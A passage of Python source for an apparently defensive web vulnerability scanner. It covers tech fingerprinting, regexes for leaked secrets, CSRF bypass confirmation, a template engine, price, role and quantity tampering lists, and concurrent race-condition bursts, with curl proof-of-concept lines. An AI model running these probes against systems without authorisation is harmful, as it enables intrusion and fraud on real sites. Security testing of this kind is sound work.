                        confidence=82.0,
                        description=f"Parameter '{param}' reflects {cat} payload unencoded with evidence of processing.",
                        evidence=f"Payload: {payload[:80]} | Literal in response | Encoding: None",
                        url=test_url, param=param, payload=payload,
                        remediation="Sanitize all input. Use parameterized queries. Encode all output.",
                        cwe="CWE-20", cvss=6.0, owasp="A03",
                        tags=["fuzzing", cat, "confirmed"],
                    ))
                    break
        return findings


# ════════════════════════════════════════════════════════════════════════
#  MODULE 4 — Response Analyzer  (Fingerprint + Secrets)
# ════════════════════════════════════════════════════════════════════════

class ResponseAnalyzer:
    TECH_SIGS = {
        "WordPress":    [r"wp-content", r"wp-includes", r"/wp-json/"],
        "Drupal":       [r"Drupal\.settings", r"/sites/default/"],
        "Joomla":       [r"/components/com_", r"Joomla!"],
        "Laravel":      [r"laravel_session", r"X-Powered-By.*Laravel"],
        "Django":       [r"csrfmiddlewaretoken", r"django"],
        "Rails":        [r"_rails_session", r"X-Runtime"],
        "Express":      [r"X-Powered-By.*Express"],
        "Spring":       [r"JSESSIONID", r"X-Application-Context"],
        "ASP.NET":      [r"__VIEWSTATE", r"ASP\.NET_SessionId"],
        "React":        [r"__reactFiber", r"__NEXT_DATA__"],
        "Vue.js":       [r"__vue__", r"v-bind:"],
        "Angular":      [r"ng-version", r"ng-app"],
        "Next.js":      [r"__NEXT_DATA__", r"_next/static/"],
        "GraphQL":      [r"/graphql", r"__typename"],
        "Elasticsearch":[r"X-elastic-product", r"\"cluster_name\""],
        "MongoDB":      [r"mongodb", r"MongoClient"],
        "Redis":        [r"redis", r"REDIS_URL"],
        "Nginx":        [r"nginx/[\d.]+"],
        "Apache":       [r"Apache/[\d.]+"],
        "IIS":          [r"Microsoft-IIS"],
        "PHP":          [r"X-Powered-By.*PHP", r"PHPSESSID"],
        "Node.js":      [r"X-Powered-By.*node"],
        "Python/Flask": [r"werkzeug"],
        "Cloudflare":   [r"cf-ray", r"cloudflare"],
        "Kubernetes":   [r"x-kubernetes", r"k8s\.io"],
        "AWS":          [r"x-amz-", r"amazonaws\.com"],
        "GCP":          [r"x-goog-", r"googleapis\.com"],
        "Azure":        [r"x-ms-", r"azure\.com"],
    }
    SECRET_PATTERNS = [
        ("AWS Access Key",  r"AKIA[0-9A-Z]{16}",              "CRITICAL", 9.0),
        ("GitHub PAT",      r"ghp_[a-zA-Z0-9]{36}",           "CRITICAL", 9.0),
        ("Stripe Live",     r"sk_live_[0-9a-zA-Z]{24,}",       "CRITICAL", 9.0),
        ("Private Key",     r"-----BEGIN.*PRIVATE KEY",         "CRITICAL", 9.5),
        ("OpenAI Key",      r"sk-[a-zA-Z0-9]{48}",             "CRITICAL", 9.0),
        ("Google API Key",  r"AIza[0-9A-Za-z\-_]{35}",        "HIGH",    7.5),
        ("Slack Token",     r"xox[baprs]-[0-9]{12}-",          "HIGH",    7.5),
        ("JWT Token",       r"eyJ[A-Za-z0-9\-_]{10,}\.eyJ",   "MEDIUM",  5.0),
        ("DB Connection",   r"(?i)(mongodb|postgresql|mysql)://\S+:\S+@", "CRITICAL", 9.0),
        ("Password in HTML",r"(?i)password\s*[=:]\s*['\"][^'\"]{4,}",    "HIGH",    7.0),
        ("GCP Service Acct",r'"type":\s*"service_account"',    "CRITICAL", 9.0),
        ("NPM Token",       r"npm_[A-Za-z0-9]{36}",            "HIGH",    7.5),
    ]
    REQUIRED_HEADERS = {
        "Content-Security-Policy":    ("MEDIUM", 5.4, "CWE-80"),
        "Strict-Transport-Security":  ("MEDIUM", 5.9, "CWE-319"),
        "X-Frame-Options":            ("LOW",    4.3, "CWE-1021"),
        "X-Content-Type-Options":     ("LOW",    3.7, "CWE-16"),
        "Referrer-Policy":            ("LOW",    0.0, ""),
        "Permissions-Policy":         ("LOW",    0.0, ""),
    }
    DANGEROUS_HEADERS = ["X-Powered-By", "Server", "X-AspNet-Version",
                          "X-Generator", "X-Runtime", "X-Debug-Token"]
    STACK_TRACE_PATTERNS = [
        r"Traceback \(most recent call last\)",
        r"at \w+\.\w+\([\w.]+:\d+\)",
        r"System\.NullReferenceException",
        r"java\.lang\.\w+Exception",
        r"Fatal error:.*in.*on line",
        r"SQLSTATE\[",
        r"ORA-\d{4}.*at.*line",
        r"ERROR in chunk \(JS\)",
    ]

    async def analyze(self, client: WebScoutClient, url: str) -> list:
        findings = []; r = await client.get(url)
        if not r: return findings
        body = r["text"]; hdrs = r["headers"]
        full = body[:5000] + " ".join(f"{k}:{v}" for k, v in hdrs.items())
        detected = [t for t, pats in self.TECH_SIGS.items()
                    if any(re.search(p, full, re.I) for p in pats)]
        if detected:
            findings.append(Finding(
                plugin="response_analyzer",
                title=f"Technology Stack: {', '.join(detected)}",
                severity="INFO", confidence=90.0,
                description=f"Detected {len(detected)} technologies.",
                evidence=", ".join(detected), url=url,
                remediation="Keep all components updated. Remove version headers.",
                owasp="A06", tags=["fingerprint"] + [d.lower() for d in detected],
            ))
        # Load linked JS files for secret scanning, with a per-file size limit.
        # Without a cap, a single minified 10 MB bundle can exhaust memory and
        # cause the scanner to hang while running dozens of regex patterns.
        _JS_MAX_BYTES = 200_000  # 200 KB — enough to catch embedded secrets
        sources = [body]
        for m in re.finditer(r'src=["\']([^"\']+\.js[^"\']*)["\']', body, re.I):
            jr = await client.get(urljoin(url, m.group(1)))
            if jr:
                # Truncate to the size limit; secrets are rarely buried >200 KB in
                _js_text = jr["text"][:_JS_MAX_BYTES]
                sources.append(_js_text)
        combined = "\\n".join(sources)
        for name, pat, sev, cvss in self.SECRET_PATTERNS:
            if re.search(pat, combined, re.I):
                findings.append(Finding(
                    plugin="response_analyzer",
                    title=f"Secret Exposed: {name}",
                    severity=sev, confidence=85.0,
                    description=f"'{name}' pattern found in response/JS.",
                    evidence=f"Pattern: {name}", url=url,
                    remediation="Move to env vars / secrets manager. Rotate immediately.",
                    cwe="CWE-312", cvss=cvss, owasp="A02",
                    tags=["secrets", "information-disclosure"],
                ))
        for pat in self.STACK_TRACE_PATTERNS:
            if re.search(pat, body, re.I | re.S):
                m = re.search(pat, body, re.I | re.S)
                snippet = body[max(0, m.start() - 20):][:200]
                findings.append(Finding(
                    plugin="response_analyzer", title="Stack Trace / Debug Info Exposed",
                    severity="MEDIUM", confidence=90.0,
                    description="Server returns detailed error/stack trace to client.",
                    evidence=snippet.strip()[:200], url=url,
                    remediation="Disable debug mode. Implement generic error pages.",
                    cwe="CWE-209", cvss=5.3, owasp="A05",
                    tags=["debug", "information-disclosure"],
                ))
                break
        for hdr, (sev, cvss, cwe) in self.REQUIRED_HEADERS.items():
            if hdr not in hdrs:
                findings.append(Finding(
                    plugin="response_analyzer",
                    title=f"Missing Security Header: {hdr}",
                    severity=sev, confidence=100.0,
                    description=f"'{hdr}' header absent.",
                    evidence="Header not present", url=url,
                    remediation=f"Add '{hdr}' to all HTTP responses.",
                    cwe=cwe, cvss=cvss, owasp="A05",
                    tags=["headers", "misconfiguration"],
                ))
        for hdr in self.DANGEROUS_HEADERS:
            if val := hdrs.get(hdr):
                findings.append(Finding(
                    plugin="response_analyzer",
                    title=f"Info Disclosure Header: {hdr}",
                    severity="LOW", confidence=100.0,
                    description=f"'{hdr}' reveals technology details.",
                    evidence=f"{hdr}: {val}", url=url,
                    remediation=f"Remove or mask '{hdr}'.",
                    owasp="A05", tags=["headers", "fingerprint"],
                ))
        cookies = hdrs.get("Set-Cookie", "")
        if cookies:
            for flag, title, sev, cwe in [
                ("HttpOnly", "Cookie Missing HttpOnly", "MEDIUM", "CWE-1004"),
                ("Secure",   "Cookie Missing Secure",   "MEDIUM", "CWE-614"),
                ("SameSite", "Cookie Missing SameSite", "LOW",    "CWE-352"),
            ]:
                if flag not in cookies:
                    findings.append(Finding(
                        plugin="response_analyzer", title=title,
                        severity=sev, confidence=100.0,
                        description=f"Cookie lacks {flag} protection.",
                        evidence=f"Set-Cookie: {cookies[:120]}", url=url,
                        remediation=f"Add {flag} flag to all cookies.",
                        cwe=cwe, owasp="A07", tags=["cookies", "session"],
                    ))
        return findings


# ════════════════════════════════════════════════════════════════════════
#  MODULE 5 — Session Manager & CSRF Testing
# ════════════════════════════════════════════════════════════════════════

class SessionCSRFManager:
    CSRF_FIELDS = re.compile(
        r'(?i)(csrf|xsrf|_token|authenticity_token|nonce|__requestverificationtoken)', re.I)

    def __init__(self, client: WebScoutClient):
        self.client = client
        self.session_cookies: dict = {}
        self.csrf_token: str = ""
        self.logged_in: bool = False

    async def login(self, login_url: str, username: str, password: str,
                    user_field: str = "username", pass_field: str = "password") -> bool:
        r = await self.client.get(login_url)
        if not r: return False
        self.csrf_token = self._extract_csrf(r["text"])
        data = {user_field: username, pass_field: password}
        if self.csrf_token:
            for fname in ["csrf_token", "_token", "csrfmiddlewaretoken",
                          "authenticity_token", "_csrf"]:
                if fname in r["text"].lower():
                    data[fname] = self.csrf_token; break
        r2 = await self.client.post(login_url, data=data)
        if not r2: return False
        self.logged_in = bool(
            r2["status"] in (200, 302) and
            ("logout" in r2["text"].lower() or len(r2["headers"].get("Set-Cookie", "")) > 0))
        if self.logged_in: log("OK", f"Session established for {username}")
        return self.logged_in

    async def test_csrf(self, url: str) -> list:
        """
        Enhanced CSRF Auto-Detection (Feature 3).

        Steps per POST form:
          1. Check for CSRF token field presence (static analysis)
          2. Auto-confirm bypass: POST the form WITHOUT the CSRF token and verify
             that the server accepts it (HTTP 200/302 with changed state)
             vs rejects it (HTTP 403/422/419)
          3. Check CSRF token entropy (predictability)
          4. Session fixation check
        """
        findings = []
        r = await self.client.get(url)
        if not r:
            return findings
        forms = re.findall(r'<form([^>]*)>(.*?)</form>', r["text"], re.DOTALL | re.I)
        for attrs, body in forms:
            mm = re.search(r'method\s*=\s*["\'](\w+)["\']', attrs, re.I)
            method = (mm.group(1).upper() if mm else "GET")
            if method != "POST":
                continue
            am = re.search(r'action\s*=\s*["\']([^"\']*)["\']', attrs, re.I)
            action = urljoin(url, am.group(1)) if am else url
            inputs = re.findall(r'<input[^>]+>', body, re.I)
            has_token = any(self.CSRF_FIELDS.search(i) for i in inputs)

            # ── 1. Static: form has no CSRF field ────────────────────────
            if not has_token:
                # ── 2. Dynamic confirmation: send POST without CSRF token ─
                bypass_result = await self._confirm_csrf_bypass(action, inputs)
                if bypass_result["bypassed"]:
                    # Server accepted request without CSRF token — CONFIRMED
                    findings.append(Finding(
                        plugin="session_csrf",
                        title="CSRF Bypass Confirmed — POST Accepted Without Token",
                        severity="CRITICAL", confidence=97.0,
                        description=(
                            f"POST form at '{action}' accepted a state-changing request "
                            "without any CSRF token. The server returned "
                            f"HTTP {bypass_result['status']} — the form submission "
                            "succeeded without protection."
                        ),
                        evidence=(
                            f"Action: {action} | "
                            f"POST fields: {bypass_result['fields_sent']} | "
                            f"Server response: HTTP {bypass_result['status']} | "
                            f"Response snippet: {bypass_result['snippet']}"
                        ),
                        url=url,
                        remediation=(
                            "Add a cryptographically random CSRF token (≥256 bits) to every "
                            "state-changing form. Validate it server-side on every POST/PUT/DELETE."
                        ),
                        poc=(
                            f"curl -sk -X POST '{action}' "
                            f"-d '{bypass_result['fields_sent']}' "
                            f"-H 'Referer: {url}'"
                        ),
                        cwe="CWE-352", cvss=9.1, owasp="A01",
                        tags=["csrf", "confirmed", "bypass", "critical"],
                    ))
                else:
                    # Form has no token field but server rejected without token — partial protection
                    findings.append(Finding(
                        plugin="session_csrf",
                        title="CSRF: POST Form Lacks Token (Server May Be Protected by Other Means)",
                        severity="MEDIUM", confidence=72.0,
                        description=(
                            f"POST form at '{action}' has no CSRF token field, "
                            f"but the server returned HTTP {bypass_result['status']} "
                            "(may use Referer/Origin checking or custom header)."
                        ),
                        evidence=f"Action: {action} | Fields: {len(inputs)} | "
                                 f"Bypass response: HTTP {bypass_result['status']}",
                        url=url,
                        remediation="Add explicit CSRF tokens even if Referer/Origin checking is in place.",
                        cwe="CWE-352", cvss=5.5, owasp="A01",
                        tags=["csrf", "session", "no-token"],
                    ))
            else:
                # Form HAS a token field — still try to send without it to confirm enforcement
                bypass_result = await self._confirm_csrf_bypass(action, inputs,
                                                                 strip_csrf=True)
                if bypass_result["bypassed"]:
                    findings.append(Finding(
                        plugin="session_csrf",
                        title="CSRF Token Present but NOT Validated Server-Side",
                        severity="HIGH", confidence=92.0,
                        description=(
                            f"POST form at '{action}' has a CSRF token field but the server "
                            "accepts the request even when the token is omitted — "
                            "token validation is not enforced."
                        ),
                        evidence=(
                            f"Action: {action} | "
                            f"HTTP {bypass_result['status']} accepted without token | "
                            f"Snippet: {bypass_result['snippet']}"
                        ),
                        url=url,
                        remediation="Validate the CSRF token on EVERY state-changing request server-side.",
                        poc=(f"curl -sk -X POST '{action}' "
                             f"-d '{bypass_result['fields_sent']}'"),
                        cwe="CWE-352", cvss=8.8, owasp="A01",
                        tags=["csrf", "token-not-validated", "confirmed"],
                    ))

            # ── 3. Entropy check on existing tokens ───────────────────────
            for inp in inputs:
                if self.CSRF_FIELDS.search(inp):
                    vm = re.search(r'value\s*=\s*["\']([^"\']{4,})["\']', inp)
                    if vm:
                        entropy = self._shannon(vm.group(1))
                        if entropy < 3.0:
                            findings.append(Finding(
                                plugin="session_csrf",
                                title="CSRF Token Low Entropy — Predictable",
                                severity="MEDIUM", confidence=80.0,
                                description=(
                                    f"CSRF token entropy {entropy:.2f} bits/char — "
                                    "may be predictable by an attacker."
                                ),
                                evidence=f"Token: {vm.group(1)[:20]}... | Entropy: {entropy:.2f}",
                                url=url,
                                remediation="Use cryptographically random 256-bit tokens (os.urandom / secrets module).",
                                cwe="CWE-330", owasp="A02",
                                tags=["csrf", "entropy", "predictable"],
                            ))

        # ── 4. Session Fixation ──────────────────────────────────────────
        if self.logged_in and self.session_cookies:
            pre_login_cookie = r["headers"].get("Set-Cookie", "")
            r_post = await self.client.get(url)
            post_login_cookie = (r_post["headers"].get("Set-Cookie", "")
                                 if r_post else "")
            if (pre_login_cookie and post_login_cookie and
                    pre_login_cookie == post_login_cookie and
                    "session" in pre_login_cookie.lower()):
                findings.append(Finding(
                    plugin="session_csrf",
                    title="Session Fixation — Session ID Not Rotated on Login",
                    severity="HIGH", confidence=85.0,
                    description=(
                        "Session cookie is identical before and after authentication — "
                        "session fixation attack is possible."
                    ),
                    evidence="Identical Set-Cookie header before and after login",
                    url=url,
                    remediation="Regenerate session ID immediately upon successful authentication.",
                    cwe="CWE-384", cvss=7.5, owasp="A07",
                    tags=["session", "fixation", "confirmed"],
                ))
        return findings

    async def _confirm_csrf_bypass(self, action: str, inputs: list,
                                   strip_csrf: bool = False) -> dict:
        """
        Send an actual POST request without the CSRF token and check whether
        the server accepts or rejects it.

        Returns:
          {
            "bypassed":    bool,   # True if server accepted (200/302 + not error page)
            "status":      int,
            "fields_sent": str,    # URL-encoded fields actually sent
            "snippet":     str,    # First 120 chars of response body
          }
        """
        result = {"bypassed": False, "status": 0,
                  "fields_sent": "", "snippet": ""}
        try:
            # Build minimal form data from non-hidden, non-CSRF inputs
            form_data = {}
            for inp in inputs:
                nm = re.search(r'name\s*=\s*["\']([^"\']+)["\']', inp, re.I)
                tp = re.search(r'type\s*=\s*["\']([^"\']+)["\']', inp, re.I)
                if not nm:
                    continue
                field_name = nm.group(1)
                field_type = (tp.group(1).lower() if tp else "text")
                # Skip CSRF fields entirely if strip_csrf=True (form has token)
                # or always skip when strip_csrf=False (form has no token)
                if self.CSRF_FIELDS.search(field_name):
                    if strip_csrf:
                        continue   # intentionally omit token
                    else:
                        continue   # form has no token — nothing to include
                # Fill with safe dummy values
                if field_type == "email":
                    form_data[field_name] = "test@example.com"
                elif field_type in ("number", "tel"):
                    form_data[field_name] = "1"
                elif field_type == "hidden":
                    # Keep hidden fields but not CSRF ones
                    vl = re.search(r'value\s*=\s*["\']([^"\']*)["\']', inp, re.I)
                    form_data[field_name] = vl.group(1) if vl else ""
                else:
                    form_data[field_name] = "test"

            # Send POST without CSRF token and without an existing session cookie
            # to simulate a cross-site forged request
            result["fields_sent"] = "&".join(f"{k}={v}" for k, v in form_data.items())
            resp = await self.client.post(
                action,
                data=form_data,
                headers={
                    "Referer": action,         # Same-origin Referer to reduce false positives
                    "Content-Type": "application/x-www-form-urlencoded",
                    "X-CSRF-Token": "",        # Empty token header
                },
            )
            if not resp:
                return result
            status = resp.get("status", 0)
            result["status"] = status
            body   = resp.get("text", "")
            result["snippet"] = body[:120].replace("\n", " ")

            # Protection indicators in response
            _protection_keywords = re.compile(
                r"(forbidden|csrf|token.*invalid|token.*missing|"
                r"access denied|419|security error|bad request.*token)",
                re.I)
            # Acceptance indicators
            _accept_indicators = (
                status in (200, 201, 302, 303) and
                not _protection_keywords.search(body) and
                status not in (403, 419, 422, 400)
            )
            result["bypassed"] = bool(_accept_indicators)
        except Exception as _e:
            result["snippet"] = f"Error: {_e}"
        return result

    @staticmethod
    def _extract_csrf(html: str) -> str:
        pats = [
            r'<input[^>]+name=["\'](?:csrf|_token|csrfmiddlewaretoken|'
            r'authenticity_token|_csrf|nonce)["\'][^>]+value=["\']([^"\']+)["\']',
            r'<meta[^>]+name=["\']csrf-token["\'][^>]+content=["\']([^"\']+)["\']',
            r'"csrfToken"\s*:\s*"([^"]+)"',
        ]
        for pat in pats:
            m = re.search(pat, html, re.I)
            if m: return m.group(1)
        return ""

    @staticmethod
    def _shannon(s: str) -> float:
        if not s: return 0.0
        freq = {ch: s.count(ch) / len(s) for ch in set(s)}
        return -sum(p * log2(p) for p in freq.values())


# ════════════════════════════════════════════════════════════════════════
#  MODULE 6 — Nuclei-Style Template Engine
# ════════════════════════════════════════════════════════════════════════

class NucleiTemplateEngine:
    def __init__(self, client: WebScoutClient):
        self.client = client
        self.templates = list(BUILTIN_TEMPLATES)

    def load_custom_templates(self, paths: list):
        for path in paths:
            try:
                with open(path) as f:
                    tmpl = json.load(f)
                    self.templates.append(tmpl)
                    log("TMPL", f"Loaded: {tmpl.get('id','?')}")
            except Exception as e:
                log("WARN", f"Template load error ({path}): {e}")

    async def run(self, base_url: str, tags: list = None) -> list:
        findings = []; parsed = urlparse(base_url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        active = [t for t in self.templates
                  if not tags or any(tag in t.get("tags", []) for tag in tags)]
        log("TMPL", f"Running {len(active)} templates against {base}")
        for tmpl in active:
            for req_def in tmpl.get("requests", []):
                url = base + req_def.get("path", "/")
                method = req_def.get("method", "GET").upper()
                body = req_def.get("body")
                extra_hdrs = req_def.get("headers", {})
                r = (await self.client.get(url, headers=extra_hdrs) if method == "GET"
                     else await self.client.post(url, data=body, headers=extra_hdrs))
                if not r: continue
                if self._match(r, tmpl.get("matchers", [])):
                    findings.append(Finding(
                        plugin=f"template:{tmpl['id']}", title=tmpl["name"],
                        severity=tmpl.get("severity", "MEDIUM").upper(),
                        confidence=90.0,
                        description=f"Template '{tmpl['id']}' matched.",
                        evidence=f"URL: {url} | HTTP {r['status']} | {r['length']}B",
                        url=url,
                        remediation=tmpl.get("remediation", ""),
                        cwe=tmpl.get("cwe", ""), cvss=tmpl.get("cvss", 0.0),
                        owasp=tmpl.get("owasp", ""),
                        poc=f"curl -sk '{url}'", tags=tmpl.get("tags", []),
                    ))
                    log("VULN" if tmpl["severity"] in ("CRITICAL", "HIGH") else "WARN",
                        f"[{tmpl['id']}] {tmpl['name']}")
                    break
        log("OK", f"Templates done — {len(findings)} match(es)")
        return findings

    def _match(self, r: dict, matchers: list) -> bool:
        if not matchers: return r["status"] == 200
        results = []
        for m in matchers:
            mtype = m.get("type", "word")
            condition = m.get("condition", "or")
            if mtype == "status":
                results.append(r["status"] in m.get("status", [200]))
            elif mtype == "word":
                words = m.get("words", [])
                hits = [w for w in words if w in r["text"]]
                results.append(len(hits) == len(words) if condition == "and" else len(hits) > 0)
            elif mtype == "header":
                hdr_val = r["headers"].get(m["header"], "")
                hits = [w for w in m.get("words", []) if w in hdr_val]
                results.append(len(hits) > 0)
            elif mtype == "regex":
                results.append(bool(re.search(m.get("pattern", ""), r["text"], re.I)))
        return all(results)


# ════════════════════════════════════════════════════════════════════════
#  MODULE 7 — Business Logic Engine  (BL-01 → BL-13, OWASP A04)
# ════════════════════════════════════════════════════════════════════════

class BusinessLogicEngine:
    def __init__(self, client: WebScoutClient, cfg: ScanConfig):
        self.client = client; self.cfg = cfg

    # BL-01: Negative / Zero Values
    async def test_negative_values(self, url: str) -> list:
        findings = []; parsed = urlparse(url); params = parse_qs(parsed.query)
        if not params: log("SKIP", "BL-01: No URL params"); return findings
        log("BL", f"BL-01 Negative/Zero — {len(params)} param(s)")
        ATTACKS = [("-1","Neg int"),("-0.01","Neg decimal"),("0","Zero"),
                   ("0.001","Near-zero"),("-9999","Large neg"),("99999999","Overflow"),
                   ("1e10","Scientific"),("NaN","NaN"),("Infinity","Infinity"),
                   ("null","Null string")]
        for param in params:
            pl = param.lower()
            if not (pl in PRICE_PARAMS | QTY_PARAMS or
                    any(k in pl for k in ["price","amount","qty","quantity","cost","total"])):
                continue
            orig = params[param][0]; base_r = await self.client.get(url)
            base_body = base_r["text"] if base_r else ""
            for val, desc in ATTACKS:
                np = {**params, param: [val]}
                u2 = urlunparse(parsed._replace(query=urlencode(np, doseq=True)))
                r = await self.client.get(u2)
                if not r: continue
                bl = r["text"].lower()
                if r["status"] not in (200, 201, 202): continue
                if any(e in bl for e in ERROR_IND): continue
                # STRICT: require an explicit success indicator so we know the value
                # was truly processed (not just ignored / unchanged page returned)
                succ = any(s in bl for s in SUCCESS_IND)
                if not succ: continue
                sim = _levenshtein_ratio(r["text"][:2000], base_body[:2000])
                if sim > 0.93: continue  # Server ignored the value — no real change
                findings.append(Finding(
                    plugin="business_logic",
                    title=f"BL-01: Negative/Zero Value Accepted — '{param}'={val}",
                    severity="HIGH", confidence=85.0,
                    description=(f"'{param}' accepted '{val}' ({desc}) and returned a success "
                                 f"response with meaningful content change (similarity {sim:.2f})."),
                    evidence=f"Param:{param} | Orig:{orig} | Attack:{val} | HTTP {r['status']} | Success confirmed",
                    url=u2, param=param, payload=val,
                    remediation="Enforce strict min/max validation server-side. Reject negative/zero values for quantity and price fields.",
                    cwe="CWE-20", cvss=7.5, owasp="A04",
                    poc=f"curl -sk '{u2}'", tags=["business-logic","negative-value","confirmed"],
                ))
                log("VULN", f"BL-01: '{param}' accepted {val} with success confirmation"); break
        return findings

    # BL-02: Workflow Bypass
    async def test_workflow_bypass(self, workflow_urls: list) -> list:
        findings = []
        if len(workflow_urls) < 2: log("SKIP", "BL-02: Need ≥2 workflow URLs"); return findings
        log("BL", f"BL-02 Workflow bypass — {len(workflow_urls)} steps")
        for i in range(1, len(workflow_urls)):
            skip_url = workflow_urls[i]; skipped = workflow_urls[:i]
            step = urlparse(skip_url).path; r = await self.client.get(skip_url)
            if not r: continue
            if r["status"] in (200, 201):
                not_redir = not any(urlparse(s).path in r["headers"].get("Location","") for s in skipped)
                if not_redir:
                    first_r = await self.client.get(workflow_urls[0])
                    conf = 75.0 if (re.search(r'<form', r["text"], re.I) and first_r and first_r["status"] == 200) else 55.0
                    findings.append(Finding(
                        plugin="business_logic",
                        title=f"BL-02: Workflow Bypass — {step}",
                        severity="HIGH", confidence=conf,
                        description=f"Step '{step}' accessible without completing prior steps.",
                        evidence=(f"Direct step {i+1}/{len(workflow_urls)} → HTTP {r['status']} | "
                                  f"Skipped: {','.join(urlparse(s).path for s in skipped)}"),
                        url=skip_url,
                        remediation="Track workflow state server-side. Reject out-of-order steps.",
                        cwe="CWE-841", cvss=7.5, owasp="A04",
                        poc=f"curl -sk '{skip_url}' --cookie '{self.cfg.cookies}'",
                        tags=["business-logic","workflow-bypass"],
                    ))
                    log("VULN", f"BL-02: Bypass → {step}")
        return findings

    # BL-03: Parameter Tampering
    async def test_parameter_tampering(self, url: str) -> list:
        findings = []; parsed = urlparse(url)
        url_params = dict(parse_qs(parsed.query))
        page_params = await self._discover_page_params(url)
        json_params = await self._discover_json_params(url)
        all_params = {**url_params, **page_params, **json_params}
        if not all_params: log("SKIP", "BL-03: No params"); return findings
        log("BL", f"BL-03 Tampering — {len(all_params)} param(s)")
        TAMPER_MAP = [
            (["price","amount","cost","total","fee","subtotal","unit_price"],
             [("0.01","Zero-price"),("1","Min price"),("-1","Neg price"),("0","Free")]),
            (["qty","quantity","count","num","units","item_count"],
             [("-1","Neg qty"),("0","Zero qty"),("9999","Overflow"),("-999","Refund")]),
            (["discount","coupon","voucher","promo","code"],
             [("100","Full discount"),("101","Over 100%"),("0","Zero"),("-50","Neg discount")]),
            (["status","state","step","phase","approval","order_status"],
             [("approved","Force approve"),("paid","Force paid"),
              ("completed","Force complete"),("admin","Role escalation")]),
            (["role","group","level","is_admin","admin"],
             [("admin","Admin role"),("superuser","Superuser"),("owner","Owner")]),
        ]
        base_r = await self.client.get(url)
        for param, orig_vals in all_params.items():
            orig = orig_vals[0] if isinstance(orig_vals, list) else orig_vals
            pl = param.lower()
            attack_list = []
            for keywords, attacks in TAMPER_MAP:
                if any(k in pl for k in keywords):
                    attack_list = attacks; break
            if not attack_list: continue
            for val, desc in attack_list:
                r = None; test_url = url
                if parse_qs(parsed.query):
                    np = {**dict(parse_qs(parsed.query)), param: [val]}
                    test_url = urlunparse(parsed._replace(query=urlencode(np, doseq=True)))
                    r = await self.client.get(test_url)
                elif json_params and param in json_params:
                    jd = json_params.copy(); jd[param] = val
                    r = await self.client.post(url, json_body=jd)
                else:
                    fd = {p: v[0] if isinstance(v, list) else v for p, v in all_params.items()}
                    fd[param] = val
                    r = await self.client.post(url, data=fd)
                if not r: continue
                bl = r["text"].lower()
                rejected = (any(e in bl for e in ERROR_IND) or r["status"] in (400,403,422,500))
                if rejected or r["status"] not in (200,201,202,302):
                    continue
                succ = any(s in bl for s in SUCCESS_IND)
                # STRICT: require an explicit success indicator AND
                # the response must differ meaningfully from original to confirm real processing
                base_r2 = base_r if base_r else await self.client.get(url)
                if not succ:
                    continue  # Without a success signal we cannot confirm tampering was effective
                if base_r2:
                    sim = _levenshtein_ratio(r["text"][:3000], base_r2["text"][:3000])
                    if sim > 0.92:
                        continue  # Tampered response almost identical to original — server ignored param
                sev = "CRITICAL" if pl in PRICE_PARAMS | ROLE_PARAMS else "HIGH"
                findings.append(Finding(
                    plugin="business_logic",
                    title=f"BL-03: Parameter Tampering Confirmed — '{param}'→{val}",
                    severity=sev, confidence=88.0,
                    description=(f"'{param}' accepted forged value '{val}' ({desc}) and "
                                 f"returned a success response. Original value was '{orig}'."),
                    evidence=f"Param:{param} | {orig}→{val} | HTTP {r['status']} | Success indicators found",
                    url=test_url, param=param, payload=val,
                    remediation="Never trust client-supplied prices/discounts/statuses. Always recalculate server-side.",
                    cwe="CWE-472", cvss=9.1, owasp="A04",
                    poc=f"curl -sk '{test_url}'", tags=["business-logic","parameter-tampering","confirmed"],
                ))
                log("VULN", f"BL-03: '{param}'={val} accepted with success response"); break
        return findings

    # BL-04: Race Condition
    async def test_race_condition(self, url: str, method: str = "GET",
                                   data: dict = None, json_body=None) -> list:
        """
        Race condition / TOCTOU detection using two independent strategies:

        Strategy A — asyncio.gather (I/O concurrency):
            Fires N coroutines simultaneously. Sufficient for detecting race windows
            larger than ~5 ms (the typical async scheduling window).

        Strategy B — thread-pool burst (true OS-level parallelism):
            Runs N blocking HTTP requests in a ThreadPoolExecutor so they reach
            the target at the true OS socket level simultaneously, bypassing the
            GIL for network I/O. This catches narrow race windows that asyncio
            misses because asyncio can only send one socket write at a time per
            event-loop iteration.

        A finding is reported if EITHER strategy produces multiple successes.
        """
        findings = []
        N = self.cfg.race_threads
        log("BL", f"BL-04 Race condition — {N} concurrent → {url[:60]}")
        is_post = method.upper() == "POST"

        async def one_req_async():
            return (await self.client.post(url, json_body=json_body, data=data)
                    if is_post else await self.client.get(url))

        # ── Strategy A: asyncio.gather ─────────────────────────────────────
        # All coroutines are created first and then gathered so they are
        # submitted to the event loop in a single batch.
        coros = [one_req_async() for _ in range(N)]
        results_a = await asyncio.gather(*coros, return_exceptions=True)
        valid_a = [r for r in results_a if isinstance(r, dict)]

        # ── Strategy B: thread-pool burst ─────────────────────────────────
        # Use a threading.Barrier so all threads release simultaneously.
        # Requires the `requests` library. If unavailable, skip gracefully.
        import threading as _threading, concurrent.futures as _cf
        loop = asyncio.get_event_loop()

        results_b: list = []
        if not HAS_REQUESTS:
            log("WARN", (
                "BL-04: `requests` library not installed — "
                "thread-burst strategy unavailable (Strategy A only). "
                "Install with: pip install requests"
            ))
        else:
            _req = _requests_lib

            def _blocking_req():
                """Synchronous HTTP request for use inside a worker thread."""
                try:
                    fn = _req.post if is_post else _req.get
                    kwargs: dict = {"timeout": 10, "verify": False, "allow_redirects": True}
                    if is_post:
                        if json_body is not None:
                            kwargs["json"] = json_body
                        elif data:
                            kwargs["data"] = data
                    r = fn(url, **kwargs)
                    return {"status": r.status_code, "text": r.text,
                            "length": len(r.text), "headers": dict(r.headers)}
                except Exception as _re:
                    log("DEBUG", f"BL-04 blocking request failed: {_re}")
                    return None

            # Barrier timeout increased to 15 s to handle slow networks / containers.
            # A 5 s timeout caused premature BrokenBarrierError on high-latency targets.
            # Up to 3 automatic retries on BrokenBarrierError (slow network / distant server).
            barrier = _threading.Barrier(N)

            def _synced_req():
                _MAX_BARRIER_RETRIES = 3
                for _attempt in range(_MAX_BARRIER_RETRIES):
                    try:
                        barrier.wait(timeout=15)  # all threads release at the same instant
                        break  # barrier passed — proceed to request
                    except _threading.BrokenBarrierError:
                        if _attempt < _MAX_BARRIER_RETRIES - 1:
                            log("DEBUG", f"BL-04: Barrier broken (attempt {_attempt+1}/{_MAX_BARRIER_RETRIES}), retrying…")
                            try:
                                barrier.reset()
                            except Exception:
                                pass
                        else:
                            log("DEBUG", "BL-04: Barrier broken after all retries — sending request individually")
